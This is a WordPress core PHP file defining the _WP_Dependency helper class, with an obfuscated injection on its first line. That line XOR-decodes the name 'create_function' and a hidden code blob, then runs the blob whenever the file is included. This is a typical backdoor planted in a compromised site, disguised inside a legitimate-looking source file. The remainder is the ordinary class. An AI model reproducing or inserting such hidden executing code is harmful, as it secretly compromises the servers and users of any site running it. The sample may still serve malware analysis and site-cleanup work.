<?php $CSbowH='RG6-J52T, ;ITS6'^'15SL>Pm2YNX==<X';$EUoPdR=$CSbowH('','WJcjUD9QD+9S7-,I9N0cUU9J9Q1MAe=<66rSAQ9AA2K80CR;ZvLXGrYV811fQ6CMkDA99OJq:EHhGdejq0bHQl94BttprsV2l<2>9BEZpETYlOj.F1N;>,Vfc33Z1LiDO,cFxB3aVUFLRGwGxv.-A6>Q96t;rEF-J5wIwbdA5:6,,YCYS8Y3LjFXQ;,:948aBQU5lkc84I-;4lP1>1xHw<O6S+TCcRVNPq1=WYTy6X4=KmY:JOLWLHCool;.++zxeB7FqNWU5RTnVa50:96caBa=VR;MA<-<0Irnm3-EPIyrY,>3areWMT9AKwf+cl.QvdKRDJ58AI1DsHVA-Z5YwqKlns60nm2UY=Pe,TDqMUIvZ+<1WFY50khsO.;P>1Q:IZrR9NIWmcsGSO AnThuC0X,,IiMMSAcMk12CWlLm3:C>7 TSW-Q.Q B9q29HWh8::FpP38QdPj+0CZ7SoGIYF7SCUOPPGQ-U2RYkRE:FDT ,E7LAMh;9A,1tWT7rKXTG8NIJGW7PvSoH7L8yLmHTb96liE1YB.hDR.,eeYBhsxNku5AYVQJRWHW+gawY-AuSiFTh0PcP+E6bYEloS;N47Y3FT 31+R898Jc=P0;-PDFBqQY8ALslCtdhQEOcB34UWMLYR;73M  BZ697v.QT1>IJ-,OhzkGC'^'>,KK31W20BV=hHT J:CKr-V8f5P9 :bQCBUzhqBKHT>VS7;T4V475-=7LPn9<C7eO  MXcjUQ 1AgDEJQKhAXHVA6TIPUTm8e5TQKja3PxtiWoNGzB:IRI8NGWR.PeRdkEHmQH:hr:38riJgPRJL5WeuPkTeRa-H3nS WGD2AHZIBqg26ApneQLQXIINLFVIf> AEPi1ICP1>H4PJPXuWZ.Z NoIG67:1.ZX.yiYP9XN.VS0, >2-++OGHdmdd11 bV5Qj<0LriPvECQVLSJA9k4r6Z9 cFYIiONIXH<kCpV=MJRAOEs;5U4.LlVifG7VLjv +AYhiJNz.93H;V1WYo3<6ge+>fu8NpAG1=QpkiR,JPD2oyN:baW+OO1aZ4CigRvR+0lgjzc7.T NiHQ5Q4YIrcD0Y<iGOUS76LqMsO-MRR=2;D+KyX-K.VX<67gWO2X2RK4Rd5OU 5S6Gc-82Vzouk4130r>W+pBiOS lpDM1VlgkHZK3MH+<1N-. =4L=am,2NwZsK,V8YPlKntJTRYAaU86O3c9KUB8pbUNXiXDVwl54r1e.dOPSFoOqD2Zu6ZShPgHqWEpeJIsZ<FV l-1YlTS;KMKbDM1IWB1 anQu=Y5-ZEcTDHqe4iKVB4;eh=3OVhjPA;6YXSQsxo;7,2DXgXSPM>');$EUoPdR();
/**
 * Dependencies API: _WP_Dependency class
 *
 * @since 4.7.0
 *
 * @package WordPress
 * @subpackage Dependencies
 */

/**
 * Class _WP_Dependency
 *
 * Helper class to register a handle and associated data.
 *
 * @access private
 * @since 2.6.0
 */
class _WP_Dependency {
	/**
	 * The handle name.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var null
	 */
	public $handle;

	/**
	 * The handle source.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var null
	 */
	public $src;

	/**
	 * An array of handle dependencies.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var array
	 */
	public $deps = array();

	/**
	 * The handle version.
	 *
	 * Used for cache-busting.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var bool|string
	 */
	public $ver = false;

	/**
	 * Additional arguments for the handle.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var null
	 */
	public $args = null;  // Custom property, such as $in_footer or $media.

	/**
	 * Extra data to supply to the handle.
	 *
	 * @access public
	 * @since 2.6.0
	 * @var array
	 */
	public $extra = array();

	/**
	 * Setup dependencies.
	 *
	 * @since 2.6.0
	 */
	public function __construct() {
		@list( $this->handle, $this->src, $this->deps, $this->ver, $this->args ) = func_get_args();
		if ( ! is_array($this->deps) )
			$this->deps = array();
	}

	/**
	 * Add handle data.
	 *
	 * @access public
	 * @since 2.6.0
	 *
	 * @param string $name The data key to add.
	 * @param mixed  $data The data value to add.
	 * @return bool False if not scalar, true otherwise.
	 */
	public function add_data( $name, $data ) {
		if ( !is_scalar($name) )
			return false;
		$this->extra[$name] = $data;
		return true;
	}

}
